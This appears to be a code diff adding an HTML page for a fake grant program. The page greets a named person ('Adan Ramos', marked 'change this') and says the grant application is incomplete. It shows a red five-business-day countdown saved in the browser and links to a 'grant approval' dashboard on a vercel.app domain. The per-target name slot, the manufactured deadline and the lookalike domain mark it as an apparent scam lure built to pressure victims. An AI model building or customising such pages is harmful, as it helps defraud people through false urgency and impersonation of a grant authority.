@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Application Incomplete</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      font-family: Inter, Arial, sans-serif;
+      background: #f8fafc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #0f172a;
+    }
+
+    .card {
+      background: #ffffff;
+      max-width: 480px;
+      width: 90%;
+      padding: 32px;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+
+    .message {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #475569;
+      margin-bottom: 24px;
+    }
+
+    .timer {
+      font-size: 18px;
+      font-weight: 700;
+      color: #dc2626;
+      margin-bottom: 28px;
+    }
+
+    .button {
+      display: inline-block;
+      padding: 12px 22px;
+      background: #0f172a;
+      color: #ffffff;
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      transition: background 0.2s ease;
+    }
+
+    .button:hover {
+      background: #020617;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="title">Application Incomplete</div>
+
+    <div class="message" id="message"></div>
+
+    <div class="timer" id="countdown"></div>
+
+    <a href="https://us-grant-approval-page-one.vercel.app/dashboard.html" class="button">
+      View Dashboard
+    </a>
+  </div>
+
+  <script>
+    const CLIENT_NAME = "Adan Ramos"; // 🔴 change this
+    const BUSINESS_DAYS_LIMIT = 5;
+    const STORAGE_KEY = "grantApplicationDeadline";
+
+    function isBusinessDay(date) {
+      const day = date.getDay();
+      return day !== 0 && day !== 6;
+    }
+
+    function addBusinessDays(start, days) {
+      let date = new Date(start);
+      let count = 0;
+
+      while (count < days) {
+        date.setDate(date.getDate() + 1);
+        if (isBusinessDay(date)) count++;
+      }
+      return date;
+    }
+
+    function getDeadline() {
+      const stored = localStorage.getItem(STORAGE_KEY);
+      if (stored) return new Date(stored);
+
+      const deadline = addBusinessDays(new Date(), BUSINESS_DAYS_LIMIT);
+      localStorage.setItem(STORAGE_KEY, deadline.toISOString());
+      return deadline;
+    }
+
+    function updateCountdown() {
+      const deadline = getDeadline();
+      const now = new Date();
+      const diff = deadline - now;
+
+      if (diff <= 0) {
+        document.getElementById("countdown").textContent =
+          "The application deadline has been reached.";
+        return;
+      }
+
+      const hours = Math.floor(diff / (1000 * 60 * 60));
+      const minutes = Math.floor((diff / (1000 * 60)) % 60);
+      const seconds = Math.floor((diff / 1000) % 60);
+
+      document.getElementById("countdown").textContent =
+        `${hours}h ${minutes}m ${seconds}s remaining`;
+    }
+
+    document.getElementById("message").textContent =
+      `Hello ${CLIENT_NAME}, your grant application is still incomplete. 
+       The timeline for your application will end in ${BUSINESS_DAYS_LIMIT} business days.`;
+
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+  </script>
+
+</body>
+</html>
